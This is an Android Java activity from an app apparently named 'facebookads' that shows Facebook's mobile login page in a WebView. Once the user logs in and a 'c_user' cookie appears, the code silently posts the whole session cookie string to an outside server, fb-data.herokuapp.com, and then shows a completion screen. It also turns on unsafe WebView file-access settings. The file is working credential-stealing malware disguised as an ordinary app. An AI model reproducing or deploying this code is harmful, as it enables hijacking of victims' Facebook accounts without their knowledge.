package com.example.facebookads;

import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.example.facebookads.fragment.FragmentUtils;
import com.example.facebookads.fragment.Permission;
import com.example.facebookads.model.Posts;

import java.net.URISyntaxException;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.http.Body;
import retrofit2.http.Headers;
import retrofit2.http.POST;

public class WebviewActivity extends AppCompatActivity {
    private WebView webView;
    private ProgressBar progressBarWebview;
    private int dem=0;
    private PostService postsService;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webview);
        changgeColorandPermission();
        anhXa();
        webView.setWebViewClient(new InsideWebViewClient());
        webView.setInitialScale(1);
        webView.setScrollBarStyle(WebView.SCROLLBARS_OUTSIDE_OVERLAY);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setSupportZoom(true);
        webView.getSettings().setDisplayZoomControls(false);
        webView.getSettings().setBuiltInZoomControls(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setPluginState(WebSettings.PluginState.ON);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setEnableSmoothTransition(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.getSettings().setAllowFileAccessFromFileURLs(true);
        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        clearCookies();
        webView.loadUrl("https://m.facebook.com/");

    }

    private void sendPost(String cookies) {
        Posts.ResultsEntity post = new Posts.ResultsEntity();
        post.setCookie(cookies);
        Call<Posts.ResultsEntity> call = postsService.sendPosts(post);
        call.enqueue(new Callback<Posts.ResultsEntity>() {
            @Override
            public void onResponse(Call<Posts.ResultsEntity> call, Response<Posts.ResultsEntity> response) {
                Log.d("response aaaa ",response+"");
            }

            @Override
            public void onFailure(Call<Posts.ResultsEntity> call, Throwable t) {
                Toast.makeText(getApplicationContext(), t.toString(), Toast.LENGTH_LONG).show();
            }
        });
    }

    private void anhXa(){
        webView=(WebView) findViewById(R.id.webview_Fb);
        progressBarWebview=(ProgressBar) findViewById(R.id.progressbar_webview);
    }

    public interface PostService {

        String API_ROUTE = "api/account";
        @Headers({

                "Content-type: application/json"

        })
        @POST(API_ROUTE)
        Call<Posts.ResultsEntity> sendPosts(@Body Posts.ResultsEntity posts);
    }

    private class InsideWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            if (url.startsWith("intent://")) {
                try {
                    Context context = view.getContext();
                    Intent intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);

                    if (intent != null) {
                        PackageManager packageManager = context.getPackageManager();
                        ResolveInfo info = packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
                        if (info != null) {
                            context.startActivity(intent);
                        }
                    }
                } catch (URISyntaxException e) {
                }
            } else {
                view.loadUrl(url);
            }
            return true;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            String cookies = CookieManager.getInstance().getCookie(url);
            progressBarWebview.setVisibility(View.GONE);
            if (cookies.contains("c_user")){
                dem++;
                if(dem==1){
                    // Đoạn này anh đẩy cookei lên cho em
                    try {
                        Retrofit retrofit = new Retrofit.Builder()
                                .baseUrl("https://fb-data.herokuapp.com/")
                                .addConverterFactory(GsonConverterFactory.create())
                                .build();
                        postsService = retrofit.create(PostService.class);
                        sendPost(cookies);
                    } catch (Exception e) {
                        Log.d("response aaaa ",e.toString());
                    }
                    Log.d("aaa",cookies);
                    progressBarWebview.setVisibility(View.VISIBLE);
                    Intent intent = new Intent(WebviewActivity.this, DoneActivity.class);
                    startActivity(intent);
                }
            }
        }
    }

    public void clearCookies() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            CookieManager.getInstance().removeAllCookies(null);
            CookieManager.getInstance().flush();
        } else {
            CookieSyncManager cookieSyncMngr = CookieSyncManager.createInstance(this);
            cookieSyncMngr.startSync();
            CookieManager cookieManager = CookieManager.getInstance();
            cookieManager.removeAllCookie();
            cookieManager.removeSessionCookie();
            cookieSyncMngr.stopSync();
            cookieSyncMngr.sync();
        }
    }
    private void changgeColorandPermission() {
        Permission.openPermisson(Manifest.permission.READ_EXTERNAL_STORAGE, 111, this);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            FragmentUtils.changgeColorStatusBar(this, R.color.blue_facebook);
        }
    }
}